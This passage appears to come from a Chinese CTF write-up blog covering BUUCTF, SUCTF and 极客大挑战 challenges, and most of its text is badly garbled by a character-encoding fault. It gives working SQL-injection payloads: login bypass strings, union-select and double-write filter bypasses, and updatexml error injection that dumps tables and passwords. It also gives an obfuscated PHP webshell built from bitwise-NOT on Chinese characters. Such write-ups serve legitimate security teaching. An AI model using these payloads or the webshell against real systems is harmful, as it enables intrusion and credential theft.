çš„md5å€¼æ›¿æ¢åˆ°3çš„ä½ç½®ï¼Œåœ¨åå¤´å°±èƒ½æ„æˆæ»¡è¶³åç«¯åˆ¤æ–­çš„æŸ¥è¯¢è¯­å¥äº†ã€‚ è§£é¢˜éšä¾¿æ‰¾ä¸ªå¯†ç ä»¥åŠå¯†ç çš„md5å€¼ï¼Œè¿™é‡Œç”¨çš„æ˜¯123456/e10adc3949ba59abbe56e057f20f883eï¼Œæœ€ç»ˆpayloadå¦‚ä¸‹ï¼š ' union select 1,'admin','e10adc3949ba59abbe56e057f20f883e'%23 usernameå¤„è¾“å…¥payloadï¼Œpasswordè¾“å…¥123456å³å¯æ‹¿åˆ°flagã€‚ [SUCTF 2018]GetShellåˆ©ç”¨å¼‚æˆ–æ„é€ webshellï¼Œå‚è€ƒä¸Šä¸€ç¯‡åšå®¢çš„çŸ¥è¯†ç‚¹ã€‚fuzzè„šæœ¬ &lt;?phpheader('Content-Type: text/html; charset=utf-8');$str = 'å½“æˆ‘ç«™åœ¨å±±é¡¶ä¸Šä¿¯ç°åŠä¸ªé¼“æµªå±¿å’Œæ•´ä¸ªå¦é—¨çš„å¤œç©ºçš„æ—¶å€™ï¼Œæˆ‘çŸ¥é“æ­¤æ¬¡å‡ºè¡Œçš„ç›®çš„å·²ç»å®Œæˆäº†ï¼Œæˆ‘è¦å¼€å§‹æ”¶æ‹¾è¡Œæï¼Œæ˜å¤©æ—©ä¸Šç¦»å¼€è¿™é‡Œã€‚å‰å‡ å¤©æœ‰äººé—®æˆ‘ï¼Œå¤§å­¦å››å¹´ç»“æŸäº†ï¼Œä½ ä¹Ÿä¸è¯´ç‚¹ä»€ä¹ˆï¼Ÿä¹Œäº‘å‘ç”Ÿäº†ä¸€äº›äº‹æƒ…ï¼Œæ‰€æœ‰äººéƒ½ç¼„é»˜ä¸è¨€ï¼Œä½ ä¹Ÿæ˜¯ä¸€æ ·å—ï¼Ÿä½ é€ƒåˆ°å—æ–¹ï¼Œéš¾é“ä¸å›å®¶äº†å—ï¼Ÿå½“ç„¶è¦å›å®¶ï¼Œæˆ‘åªæ˜¯æƒ³æ‰¾åˆ°æˆ‘è¦æ‰¾çš„ç­”æ¡ˆã€‚å…¶å®è¿™æ¬¡å‡ºæ¥ä¸€è¶Ÿå¾ˆç´¯ï¼Œæ™šä¸Šå‡ ä¹æ˜¯çƒ­æ±—æ·‹æ¼“å›åˆ°ä½å¤„ï¼Œå¦é—¨çš„æµ·é£ä¼´ç€å¦®å¦²è·¯è¿‡åå¸¦æ¥çš„æ·…æ·…æ²¥æ²¥çš„å°é›¨ï¼Œä¹Ÿå»ä¸èµ°æˆ‘èº«ä¸Šä»»ä½•ä¸€ä¸ªæ¯›å­”é‡Œçš„çƒ­æ°”ã€‚å¥½åœ¨æ—…ç¤¾çš„ç”Ÿæ´»ç”¨å“ä¸€åº”ä¿±å…¨ï¼Œæ´—å®Œæ¾¡åæˆ‘çˆ¬åˆ°å±‹é¡¶ã€‚æ—…ç¤¾æ˜¯ä¸€ä¸ªè€åˆ«å¢…ï¼Œè¯´èµ·æ¥ä¹Ÿä¸ç®—è€ï¼Œæ¯”èµ·éš”å£ä¸€å®¶æ—§ä¸­å›½æ—¶æœŸçš„æˆ¿å­è¦è±ªåå¾—å¤šï¼Œç«–ç«‹åœ¨ç¬”å±±é¡¶ä¸Šä¸å¦é—¨å²›éš”æµ·ç›¸æœ›ã€‚ç«™åœ¨å±‹é¡¶å‘ä¸‹çœ‹ï¼Œç¯ç«é˜‘çŠçš„é¼“æµªå±¿è¡—å¸‚å‚æ‚åœ¨ç»¿æ ‘ä¸æ¥¼å®‡é—´ï¼Œä¾ç¨€è¿˜å¯ä»¥çœ‹åˆ°ç†™ç†™æ”˜æ”˜çš„æ¸¸å®¢ã€‚å¤§æ¦‚æ˜¯å¤œæ™šæ¸æ·±çš„ç¼˜æ•…ï¼Œå‘¨å›´æ…¢æ…¢å˜å¾—å®é™ä¸‹æ¥ï¼Œæˆ‘å¿˜è®°ç™½å¤©åœ¨å¥”æ³¢ä»€ä¹ˆï¼Œç›´åˆ°ç«™åœ¨è¿™é‡Œçš„æ—¶å€™ï¼Œæˆ‘æ‰çŸ¥é“æˆ‘å¯»æ‰¾çš„ç­”æ¡ˆå¹¶ä¸åœ¨å—æ–¹ã€‚å½“ç„¶ä¹Ÿä¸åœ¨åŒ—æ–¹ï¼ŒåŒ—äº¬çš„å¾ˆå¤šä¸œè¥¿è®©æˆ‘éå¸¸ä¸§æ°”ï¼ŒåŒ…æ‹¬è‡ªæ˜åŸå¢“çš„ä¸­ä»‹å’Œé¢æŒ‡æ°”ä½¿çš„å¤§äººä»¬ï¼›åŒ—äº¬ä¹Ÿæœ‰å¾ˆå¤šä¸œè¥¿è®©æˆ‘å–œæ¬¢ï¼Œæˆ‘å–œæ¬¢é¢å’Œå›­å¤è‰²å¤é¦™çš„ç‰æ¾œå ‚ï¼Œæˆ‘å–œæ¬¢æœé˜³é—¨é‚£å—â€œæ°¸å»¶å¸ç¥šâ€çš„ç‰ŒåŠï¼Œå–œæ¬¢åŒ—äº¬é³æ¬¡æ ‰æ¯”çš„è€å®…å­å’Œå—é”£é¼“å··çš„å°åƒã€‚ä½†è¿™äº›éƒ½ä¸æ˜¯æˆ‘è¦çš„ç­”æ¡ˆï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“æˆ‘è¿½éšçš„æ˜¯ä»€ä¹ˆï¼Œä½†æƒ³æƒ³ç™¾å¹´åç•™ä¸‹çš„åˆæ˜¯ä»€ä¹ˆï¼Œæƒ³æƒ³å°±å¾ˆå¯æ€•ã€‚æˆ‘æ›¾ç»ä¸ºäº†åƒä¸€ç¢—è‡­è±†è…ï¼Œåç€ä¼˜æ­¥ä»ä¸Šåœ°åˆ°åŒ—æµ·åŒ—ï¼Œå…´å†²å†²åœ°æ¥åˆ°é‚£ä¸ªå‚æ¶å·²ä¹…çš„è±†è…æ‘Šå‰ï¼Œç”¨æ€¥åˆ‡åˆå®³ç¾çš„å£å»å¯¹è€æ¿è¯´ï¼Œæ¥ä¸¤ä»½é‡çš„è‡­è±†è…ã€‚å…¶å®ä¹Ÿåªè¦10å—é’±ï¼Œåƒå®Œä»¥åä¾¿æ˜¯æ— ä¸ä¼¦æ¯”çš„æ»¡è¶³æ„Ÿã€‚æˆ‘è®°å¾—é‚£æ˜¯æ¯•ä¸šè®¾è®¡å®¡æ ¸å‰å¤•çš„ä¸€ä¸ªåˆåï¼Œäº”æœˆçš„åŒ—äº¬è¿˜ä¸ç®—ç‚çƒ­ï¼Œå’Œç…¦çš„é˜³å…‰é¡ºç€è·¯è¾¹è€æˆ¿å­çš„å±‹æªæ´’å‘å¤§åœ°ï¼Œä½†æˆ‘è¿˜æ˜¯ä¸æ•¢ç«™åœ¨é˜³å…‰ä¸‹ï¼Œæ˜¥å¤©çš„ç‡¥çƒ­éš¾è€ä¹Ÿç»ä¸è¾“ç»™å¤å¤©ã€‚å°±åƒå¾ˆå¤šäººå†·å˜²çƒ­è®½çš„é‚£æ ·ï¼Œåšè¿™ä¸€è¡Œè°æ•¢æŠŠè‡ªå·±å®Œå…¨æ›å…‰ï¼Œç”­ç®¡ä½ æ˜¯é»‘å¸½å­ç™½å¸½å­è¿˜æ˜¯ç»¿å¸½å­ã€‚ç”Ÿæ´»åœ¨é‚£ä¸ªæ—¶å€™è¿˜ç®—ç¾å¥½ï¼Œæˆ‘ä¾æ—§æ˜¯ä¸€ä¸ªå­¦ç”Ÿï¼Œå‡ å¤©å‰è¾åˆ«çš„åŒä¼´è¿˜åœ¨æœä¹æ™šäº”çš„å·¥ä½œï¼Œä¸€åˆ‡éƒ½ç…§æ—§è¿è¡Œï¼Œæ³¢æ¾œä¸è¿œèµ°åƒé‡Œåƒè±†è…è¿™ç§ç†æƒ³ä¸»ä¹‰çš„äº‹æƒ…è¿™å‡ å¹´åœ¨æˆ‘èº«ä¸Šå±¡å±¡å‘ç”Ÿï¼Œç”šè‡³å—ä¸‹æ­¤è¡Œä¹Ÿä¸ä¾‹å¤–ã€‚ä¸€å¹´å‰çš„è¿™ä¸ªæ—¶å€™æˆ‘è®¸è¿‡ä¸€ä¸ªå¿ƒæ„¿ï¼Œåœ¨å—æ™®é™€ï¼Œæˆ‘ç‰¹ä¸ºæ­¤æ¥è¿˜æ„¿ã€‚ç†æƒ³åŒ–ã€å•çº¯ä¸æ‹æ—§ï¼Œå…¶ä¸­å•çº¯å¯ä¸æ˜¯ä¸€ä¸ªå¤šä¹ˆä»¤äººç§°èµçš„å½¢å®¹ï¼Œå¾ˆå¤šäººæŠŠä»–å’Œå‚»æŒ‚é’©ã€‚â€œä½ å¤ªå•çº¯äº†ï¼Œä½ è¿˜æƒ³ç€è¿™ä¸€åˆ‡ä¼šå¥½èµ·æ¥â€ï¼Œå¯¹å‘€ï¼Œåœ¨ç”·æ¬¢å¥³çˆ±é‚£äº›äº‹æƒ…ä¸Šï¼Œæˆ‘å¯ä¸å•çº¯ï¼Œä½†æœ‰äº›èƒ½è®©äººå˜å¾—åœ†æ»‘ä¸ä¸–æ•…çš„æŠ‰æ‹©ä¸­ï¼Œæˆ‘å®æ„¿æƒ³çš„æ›´å•çº¯ä¸€äº›ã€‚å»å¹´å†¬å¤©å­¤èº«ä¸€äººæ¥åˆ°åŒ—äº¬ï¼Œæ”¾å¼ƒäº†åœ¨è…¾è®¯åšä¸€ä¸ªå®‰é€¸çš„å®ä¹ ç”Ÿçš„æœºä¼šï¼ŒåŸå› æœ‰å¾ˆå¤šä¹Ÿå¾ˆéš¾è¯´ã€‚åœ¨è…¾è®¯çŸ­æš‚çš„å®ä¹ ç”Ÿæ´»è®©æˆ‘è®°å¿†çŠ¹æ–°ï¼Œæˆ‘æ„Ÿè§‰è¿™è¾ˆå­ä¸ä¼šå†åƒä¸€ä¸ªå°å­©ä¸€æ ·è¢«æ‰€æœ‰äººå® äº†ï¼Œè¿™äº›å½“æˆ‘é€‰æ‹©åŒ—æ¼‚çš„æ—¶å€™åº”è¯¥å°±è¦æƒ³åˆ°çš„ã€‚åŒ—äº¬çš„å†¬å¤©åˆºéª¨çš„å¯’å†·ï¼Œç‰¹åˆ«æ˜¯2015å¹´çš„è…Šæœˆï¼Œæœ‰å‡ å¤©è¿ç»­ä¸‹ç€æš´é›ªï¼Œè·¯ä¸Šçš„ç§¯é›ªä¸€è¸©åŠæ­¥æ·±ï¼Œå’¯å±å’¯å±å“ï¼Œå‘¨é­å´é™çš„åƒæ·±å±±é‡Œçš„å¤åˆ¹ã€‚æˆ‘ä½çš„å°åŒºç¦»å…¬å¸æœ‰ä¸€æ®µè·ç¦»ï¼Œæ‰ä¸‹é›ªçš„é‚£å¤©æˆ‘ç”šè‡³è¿˜èµ°ç€å›å®¶ã€‚åŒ—äº¬çš„å†¬å¤©æœ€å¯æ€•çš„æ˜¯å¯’é£ï¼Œèµ°åˆ°å®¶é‡Œè€³æœµå·²ç»ç¡¬é‚¦é‚¦å¥½åƒä¸€ç¢°å°±ä¼šç¢ï¼Œåœ¨æˆ‘ä¸€å¤´æ‰è¿›è¢«çªé‡Œçš„æ—¶å€™ï¼Œæˆ‘å´æ…¢æ…¢å–œæ¬¢ä¸Šè¿™ä¸ªå¤éƒ½äº†ã€‚æˆ‘æƒ³åˆ°ã€Šé›æ­£çš‡å¸ã€‹é‡Œèƒ¤ç¦›åœ¨åŒ—äº¬çš„é¹…æ¯›å¤§é›ªé‡Œæ”¾å‡ºåä¸‰çˆ·ï¼Œé‚£ä¸ªæ‹¼å‘½åä¸‰éƒå¸¦ç€ä»¤ç‰Œå–ä¸‹ä¸°å°å¤§è¥çš„å…µæƒï¼Œä¿äº†å¤§æ¸…æ±Ÿå±±ç››ä¸–çš„å»¶ç»­ä¸ç¨³å›ºã€‚é‚£ä¸€å¤œï¼ŒåŒ—äº¬çš„æ¼«å¤©å¤§é›ªç»ä¸é€Šäºä»Šæ—¥ï¼Œè€Œæ˜”äººå·²ä½œå¤ï¼Œæ¥è€…å°šä¸èƒ½åŠï¼Œå¤šä¹ˆæ‚²å“€ã€‚è¿™ä¸ªå¤éƒ½æ‰¿è½½ç€å¤ªå¤šå†å²çš„åšé‡æ„Ÿï¼Œç‰¹åˆ«æ˜¯ä¸‹é›ªçš„å­£èŠ‚ï¼Œæˆ‘å¯ä»¥æƒ³åˆ°ä¹¾æ¸…å®«å‰å¹¿åœºä¸Šåƒç™¾å¹´å¯‚å¯çš„é›•é¾™ä¸é“œé¾Ÿï¼Œå±‹æªä¸Šçš„ç§¯é›ªï¼Œé«˜é«˜åœ¨ä¸Šçš„é¸±å»ï¼Œæƒ³åˆ°æ•°ç™¾å¹´çš„æ²§æ¡‘ä¸æœä»£æ›´è¿­ã€‚é›ªåœçš„é‚£å¤©æˆ‘å»äº†é¢å’Œå›­ï¼Œæˆ‘è®°å¾—æˆ‘ç­‰äº†å¾ˆä¹…æ‰æ‘‡æ‘‡æ‘†æ‘†æ¥äº†ä¸€è¾†å…¬äº¤è½¦ï¼Œè½¦ä¸Šå‡ ä¹æ²¡æœ‰äººï¼Œå¸æœºå°å¿ƒç¿¼ç¿¼åœ°è½¬åŠ¨ç€æ–¹å‘ç›˜ï¼Œåœ¨æ¹¿æ»‘çš„é“è·¯ä¸Šç¼“æ…¢å‰è¡Œã€‚çª—å¤–ç™½èŒ«èŒ«ä¸€ç‰‡ï¼Œé˜³å…‰ç…§åœ¨é›ªåœ°ä¸Šæœ‰äº›åˆºçœ¼ï¼Œæˆ‘æ‰ä½ä¸‹å¤´ã€‚é¢å’Œå›­çš„å­¦ç”Ÿç¥¨ç”šè‡³æ¯”åœ°é“ç¥¨è¿˜ä¾¿å®œã€‚åœ¨æ˜†æ˜æ¹–ç•”çœºæœ›æ¹–é¢ï¼Œå¾®å¾®æ³›ç€å¤•é˜³éœå…‰çš„æ¹–æ°´å°šæœªç»“å†°ï¼Œè¸©ç€é‚£äº›å¯èƒ½è¢«å¾¡ç¢¾è½§è¿‡çš„åœŸåœ°ï¼Œæ»‘äº†æ— æ•°è·¤ï¼Œæœ€ååªèƒ½æ‰¶ç€æ¹–è¾¹çš„çŸ³ç‹®å­å¹æ°”ï¼Œä¸ºä»€ä¹ˆæ²¡ç©¿é˜²æ»‘çš„é‹å­ã€‚æ˜†æ˜æ¹–è¿™ä¸€æ±ªæ¸…æ°´ï¼Œè§è¯äº†å…‰ç»ªçš‡å¸è¢«å›šç¦åè½½çš„è¹‰è·å²æœˆï¼Œè§è¯äº†é™å®‰å…ˆç”Ÿèª“ä¸ºå…ˆæœè€Œè‡ªæººï¼Œä¹Ÿè§è¯äº†å…±å’Œå›½ä»¥æ¥å›ºå®ˆä¸å¼€æ”¾çš„äº¤å ã€‚è¯´èµ·æ¥ï¼Œå®¶é‡Œæœ‰æœ¬å«çªè‘—çš„ã€Šäººé—´è¯è¯å…¸è¯„ã€‹ï¼Œæœ¬æƒ³ä¹°æ¥ç»ä»°ä¸€ä¸‹ç‹é™å®‰çš„è¿™ç¯‡å¤å…¸ç¾å­¦å·¨è‘—ï¼Œæ²¡æƒ³åˆ°å…¨ä¹¦å¤šæ˜¯ä»¥æ‰¹åˆ¤ä¸ºä¸»ã€‚æˆ‘è‡ªè¯©æƒ³å½“æ–‡äººçš„é»‘å®¢ï¼Œå…¶å®ä¹Ÿåªæ˜¯å˜´é‡Œè¯´è¯´ï¼ŒçœŸåˆ°è¯„è¯´æ–‡ç« æ˜¯éçš„æ—¶å€™ï¼Œæˆ‘å´å¼ å£æ— è¯ã€‚å€’æ˜¯èª“æ­»ä¸å»å‘ï¼Œè¿™ç‚¹ç¡®å®è®©æˆ‘æ— é™æ„Ÿæ…¨ï¼šä¸­å›½å£«å¤§å¤«çš„éª¨æ°”ï¼ŒçœŸçš„æ˜¯ä»å±ˆåŸæŠ•æ°´çš„é‚£ä¸€åˆ»å°±å¥ å®šä¸‹æ¥çš„ã€‚æœ‰å¥è¯è¯´ï¼Œå¤å¾€ä»Šæ¥ä¸­å›½ä¸‰å¤§å¤©æ‰æ­»äºæ°´ï¼Œå…¶ä¸€å±ˆåŸï¼Œå…¶äºŒæç™½ï¼Œå…¶ä¸‰ç‹å›½ç»´ã€‚å«çªå¯¹æ­¤è¯é¢‡æœ‰ä¸æœï¼Œä¸çº ç»“ç‹å›½ç»´æ˜¯å¦èƒ½å¤Ÿä¸å‰äºŒè€…ç›¸æå¹¶è®ºï¼Œæˆ‘å•å–œæ¬¢ä»–çš„ç›´ç™½ï¼Œèƒ½ç•…å¿«è¯„è¯´å¤ä»Šè¯è¯çš„äººï¼Œä¹Ÿè®¸æ— å‡ºå…¶å³äº†å§ã€‚äººè¨€å¯ç•ã€äººè¨€å¯ç•ï¼Œè¶Šåˆ°ç°ä»£è¶Šä¼šæ·±æ·±æ„Ÿè§‰åˆ°è¿™å¥è¯çš„æ­£ç¡®ï¼Œçœ‹åˆ°å¾ˆå¤šäº‹æƒ…çš„å‘å±•å¾€å¾€è¢«èˆ†è®ºæ‰€å·¦å³ï¼Œå°±è¶Šç¾¡æ…•é‚£äº›æ— æ‰€ç•æƒ§çš„äººï¼Œä¸è®ºä»–ä»¬æ˜¯å‹‡æ•¢è¿˜æ˜¯è‡ªè´Ÿã€‚æ­¤é—´äººç‹å ç®—ä¸€ä¸ªï¼Œç½‘ç»œä¸Šäººä»¬å¯¹ä»–æ¯èª‰å‚åŠï¼Œä½†ç¡®å®æœ‰æœ¬äº‹è€Œåˆä¸çŸ«æ‰åšä½œï¼Œæ”¾èƒ†ç›´è¨€å¿ƒæ¯”å¤©é«˜çš„åªæœ‰ä»–ä¸€ä¸ªäº†ã€‚é‚£å¤©åœ¨æ˜†æ˜æ¹–ç•”çœ‹è¿‡å¤•é˜³ï¼Œç›´åˆ°å¤©ç©ºå˜çš„æ— æ¯”æ·±é‚ƒï¼Œæˆ‘æ‰æ…¢æ…¢å¾€å®¶çš„æ–¹å‘èµ°ã€‚è€³æœºæ”¾ç€åå¼¦çš„ã€Šæ˜†æ˜æ¹–ã€‹ï¼Œä¸çŸ¥ä¸è§‰å·²ç»åå¹´äº†ï¼Œä¸çŸ¥é“è¿™æ—¶å€™ä»–æœ‰æ²¡æœ‰å›é¦–æœ›æœ›è‡ªå·±çš„ä¹å…¬ä¸»å’Œå®‰å¨œï¼Œæ˜¯å¦è¿˜èƒ½å¤Ÿâ€œæ³¼å¢¨é€ ä¸€åŒ¹å¿«é©¬ï¼Œè¿½å›åå¹´å‰å§‘å¨˜â€ã€‚åæ¥ï¼Œæ„Ÿè§‰ä¸€åˆ‡éƒ½æ­¥å…¥æ­£è½¨ï¼Œå­¦ä½è¯ä¹Ÿé¡ºåˆ©æ‹¿åˆ°ï¼Œæˆ‘åŒ†åŒ†å‘Šåˆ«äº†è‡ªå·±çš„å¤§å­¦ã€‚åæ¥ä¹Ÿé‡åˆ°äº†å¾ˆå¤šäº‹ï¼Œäº‹åæœ‰äººæ‰¾æˆ‘ï¼Œå¾ˆå¤šäººå…³å¿ƒä½ ï¼Œå°‘æ•°äººå¯èƒ½ä¸æ˜¯ï¼Œä½†å‡ºäº†å­¦æ ¡ä»¥åï¼Œåˆæœ‰å¤šå°‘äººå’Œäº‹æƒ…å®Œå…¨æ²¡æœ‰ç›®çš„å‘¢ï¼Ÿæˆ‘ä¹Ÿè€ƒè™‘äº†å¾ˆå¤šå»å¤„ï¼Œä½†ä¸€ç›´æ²¡æœ‰å†³æ–­ï¼Œå€’æœ‰å¿µæ€€æ—§ä¸»ï¼Œä¹Ÿæœ‰å¦„è‡ªè²è–„ä¹‹æ„ï¼Œæˆ‘å¸Œæœ›è‡ªå·±èƒ½åšå‡ºç‚¹æˆç»©å†å»è°ˆå…¶ä»–çš„ï¼Œæ‰€ä»¥å¾ˆä¹…éƒ½æ˜¯é—­é—¨ä¸å‡ºï¼Œç¢ç£¨ä¸œè¥¿ã€‚æ¥åˆ°å¦é—¨ï¼Œæˆ‘è¿˜äº†ä¸€ä¸ªæ„¿ï¼Œåˆè®¸äº†æ–°çš„æ„¿æœ›ï¼Œå¸Œæœ›æˆ‘è¿˜ä¼šå†æ¬¡æ¥è¿˜æ„¿ã€‚æˆ‘åˆæ¥åˆ°äº†ä¸Šæ¬¡æ²¡ä½å¤Ÿçš„é¼“æµªå±¿ï¼Œè®¢äº†ä¸€é—´å®‰é™çš„æˆ¿å­ï¼Œåªæœ‰æˆ‘ä¸€ä¸ªäººã€‚åœ¨è¿™é‡Œï¼Œèƒ½å¬åˆ°çš„åªæœ‰è¿œå¤„å±‹æªä¸‹é¸Ÿå„¿å½å½å–³å–³çš„é¸£å«å£°ï¼Œè¿œå¤„çš„å–§åš£æ—©å·²çƒŸæ¶ˆäº‘æ•£ï¼Œå³ä½¿è¿™åªæ˜¯æš‚æ—¶çš„ã€‚ç«™åœ¨å±‹é¡¶çš„æˆ‘ï¼Œå–ä¸‹æ¯ä¸­æœ€åä¸€å£æ°´ã€‚æ¸…æ™¨ï¼ŒèƒŒç€è¡Œæï¼Œæˆ‘ä¹˜è½®æ¸¡ç¦»å¼€äº†é¼“æµªå±¿ï¼Œè¿™æ˜¯æˆ‘ç¬¬äºŒæ¬¡æ¥é¼“æµªå±¿ï¼Œè°çŸ¥é“ä¼šä¸ä¼šæ˜¯æœ€åä¸€æ¬¡ã€‚æˆ‘åœ¨è¿™é‡Œä½äº†ä¸‰å¤©ï¼Œç”¨ä¸‰å¤©å»å¯»æ‰¾äº†ä¸€ä¸ªç­”æ¡ˆã€‚ä¸çŸ¥ä¸è§‰æˆ‘åˆæƒ³åˆ°è¾œé¸¿é“­ä¸æ²ˆå­åŸ¹çš„é‚£æ®µå¯¹è¯ã€‚â€œå¤§éš¾ä¸´å¤´ï¼Œä½•ä»¥ä¸ºä¹‹ï¼Ÿâ€â€œä¸–å—å›½æ©ï¼Œæ­»ç”Ÿç³»ä¹‹ã€‚â€';for($i=0; $i&lt;mb_strlen($str, 'utf-8'); $i++){ $st = mb_substr($str, $i,1, 'utf-8'); $a = ~($st); $b = $a[1]; #å–æ±‰å­—çš„ç¬¬ä¸€ä½ if($b==$_GET['a']) #$_GET['a']æƒ³è¦å¾—åˆ°çš„å­—ç¬¦ { echo $st;exit; } }?&gt; æ„é€ webshell &lt;?php $__=[]; $___=[]; $_=$__==$___;//true = 1 ç”¨ä½œç´¢å¼• $__=~(ç°); $___=$__[$_];//a $__=~(åŒ—); $___.=$__[$_].$__[$_];//ss $__=~(çš„); $___.=$__[$_];//e $__=~(åŠ); $___.=$__[$_];//r $__=~(æ‹¾); $___.=$__[$_];//t $____=~(~(_));//_ $__=~(è¯´); $____.=$__[$_];//P $__=~(å°); $____.=$__[$_];//O $__=~(æ¬¡); $____.=$__[$_];//S $__=~(ç«™); $____.=$__[$_];//T $_=$$____; $___($_[_]); ?&gt; è¿™é¢˜è¿˜æ²¡å¤ç°æˆåŠŸï¼Œåç»­ä¼šè¡¥å……â€¦","link":"/2020/02/15/BUUCTF-web%E5%88%B7%E9%A2%98%E2%85%A2/"},{"title":"æå®¢å¤§æŒ‘æˆ˜é¢˜ç›®è§£æ","text":"è¿™é‡Œæ˜¯æå®¢å¤§æŒ‘æˆ˜äº”ä¸ªsqlæ³¨å…¥é¢˜ç›®çš„è§£æåˆé›†ï¼Œéƒ½æ˜¯å¸¸ç”¨çš„æ³¨å…¥å§¿åŠ¿ï¼Œå…¥é—¨åˆ°åŸºç¡€çº§çš„ã€‚ [æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQLä¸‡èƒ½å¯†ç ç™»å½•ç®¡ç†å‘˜è´¦æˆ·å³å¯ï¼Œè¿™é‡Œæ³¨æ„ä¸€ä¸‹ï¼Œä¸‡èƒ½å¯†ç ç”¨çš„æ—¶å€™æ³¨æ„æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•´å½¢ï¼Œè¿™ä¸ªé¢˜æ˜¯å­—ç¬¦å‹ï¼Œå³ï¼š -1' or '1'='1 å¦‚æœæ˜¯æ•´å½¢ï¼Œåˆ™ç”¨ä¸‡èƒ½å¯†ç ï¼š -1' or 1=1 ä¸‡èƒ½å¯†ç è¿˜æœ‰å¾ˆå¤šï¼Œå¯ä»¥å‚è€ƒç½‘ä¸Šçš„ä¿¡æ¯ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªï¼šhttps://www.cnblogs.com/pass-A/p/11134988.html [æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQLè€ƒå¯Ÿå¸¸è§çš„ä¸‡èƒ½å¯†ç ç™»å½•ä»¥åŠunion selectæ³¨å…¥ é¢˜ç›®åˆ†æè¿›å…¥é¢˜ç›®çœ‹åˆ°æ˜¯ä¸€ä¸ªç™»å½•æ¡†ï¼Œç»è¿‡å°è¯•å‘ç°å­—ç¬¦å‹çš„ä¸‡èƒ½å¯†ç 1' or '1'='1å¯ä»¥ç™»å½•ï¼Œå¹¶ä¸”åœ¨usernameå’Œpasswordå¤„éƒ½å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œç„¶åè¿›è¡Œå¸¸è§„çš„æ³¨å…¥å°±è¡Œäº†ã€‚ è§£é¢˜çˆ†åº“ï¼š /check.php?username=admin&amp;password=admin'%20union%20select%201%2C2%2Cgroup_concat(schema_name)+from+information_schema.schemata%23 çˆ†è¡¨åï¼š /check.php?username=admin&amp;password=admin'%20union%20select%201%2C2%2Cgroup_concat(table_name)+from+information_schema.tables%20where%20table_schema%3Ddatabase()%20%23 å¯ä»¥çœ‹åˆ°ä¸€ä¸ªè¡¨ål0ve1ysq1ï¼Œflagåº”è¯¥åœ¨å…¶ä¸­ï¼Œé‚£ä¹ˆå°±çœ‹ä¸€ä¸‹è¿™ä¸ªè¡¨åŒ…å«çš„åˆ—çˆ†åˆ—åï¼š /check.php?username=admin&amp;password=admin'%20union%20select%201%2C2%2Cgroup_concat(column_name)%20from%20information_schema.columns%20where%20table_name%3D'l0ve1ysq1'%20%23 çœ‹åˆ°å­˜åœ¨passwordåˆ—ï¼Œflagåº”è¯¥åœ¨å…¶ä¸­æŸ¥å­—æ®µï¼š /check.php?username=admin&amp;password=admin'%20union%20select%201%2C2%2Cgroup_concat(password)%20from%20l0ve1ysq1%23 å¦‚å›¾ï¼ŒæˆåŠŸæ‹¿åˆ°flagã€‚ [æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQLè€ƒå¯ŸåŒå†™ç»•è¿‡ é¢˜ç›®åˆ†æåœ¨ç™»é™†çª—å£ï¼Œåˆ©ç”¨ä¸‡èƒ½å¯†ç çš„æ—¶å€™ç›´æ¥1' or '1'='1å‘ç°ä¸è¡Œï¼Œä½†æ˜¯1' oorr '1'='1å¯ä»¥ï¼Œç”±æ­¤çŒœæµ‹è€ƒå¯ŸåŒå†™ç»•è¿‡ã€‚é€šè¿‡æµ‹è¯•å‘ç°äº†orã€fromã€unionã€selectã€whereè¢«æ›¿æ¢ä¸ºç©ºäº†ï¼Œå› æ­¤éœ€è¦åˆ©ç”¨åŒå†™ç»•è¿‡ã€‚ è§£é¢˜é¦–å…ˆåˆ©ç”¨åŒå†™çˆ†åº“ï¼š /check.php?username=admin&amp;password=admin' uniounionn selecselectt 1,2,group_concat(schema_name)%20frfromom%20infoorrmation_schema.schemata%20%23 ç„¶åçˆ†è¡¨åï¼š /check.php?username=admin&amp;password=admin' uniounionn selecselectt 1,2,group_concat(table_name)%20frfromom%20infoorrmation_schema.tables%20whwhereere%20table_schema%3Ddatabase()%23 çˆ†åˆ—åï¼š /check.php?username=admin&amp;password=admin' uniounionn selecselectt 1,2,group_concat(column_name)%20frfromom%20infoorrmation_schema.columns%20whwhereere%20table_name%3D'b4bsql'%23 æ‹¿flagï¼š /check.php?username=admin&amp;password=admin' uniounionn selecselectt 1,2,group_concat(passwoorrd)%20frfromom%20b4bsql%23 [æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQLä¸»è¦è€ƒå¯ŸæŠ¥é”™æ³¨å…¥ï¼ŒåŒæ—¶è¿˜è€ƒå¯Ÿå¯¹ç©ºæ ¼è¿‡æ»¤çš„ç»•è¿‡ï¼Œä»¥åŠåˆ©ç”¨leftå’Œrightæˆªå–å‡½æ•°è¯»å–å®Œæ•´flagã€‚å…³äºæŠ¥é”™æ³¨å…¥çš„è®²è§£ï¼Œæˆ‘çš„åšå®¢é‡Œè¿˜æœ‰ï¼Œåœ¨æ ‡ç­¾é‡Œå¯ä»¥æ‰¾åˆ°ã€‚ è§£é¢˜æœ¬é¢˜å­¦åˆ°äº†ä¸€ä¸ªæ–°ç‚¹ï¼šç”¨^ä»£æ›¿ç©ºæ ¼æ¥è¿æ¥updatexmlå‡½æ•°ã€‚é¦–å…ˆæ‹¿åº“åï¼š /check.php?username=admin&amp;password=admin'^updatexml(1,concat(0x7e,(select(database())),0x7e),1)%23 æ³¨æ„è¿™é‡Œçš„#ä¸€å®šè¦ç”¨urlencodeä¹‹åçš„%23ï¼Œå¦åˆ™ä¼šæç¤ºè¯­æ³•é”™è¯¯ï¼Œä¹Ÿæ²¡ææ¸…æ¥šåŸå› ï¼Œå¯ä»¥å‚è€ƒä¸€ä¸‹è¿™é‡Œï¼Œå»ºè®®åœ¨å¯¹urlè¿›è¡Œæ“ä½œçš„æ—¶å€™è¿˜æ˜¯éƒ½å…ˆç¼–ç ä¸€ä¸‹ã€‚æ‹¿åˆ°åº“åï¼šçˆ†è¡¨åï¼š /check.php?username=admin&amp;password=admin'^updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like('geek'))),0x7e),1)%23 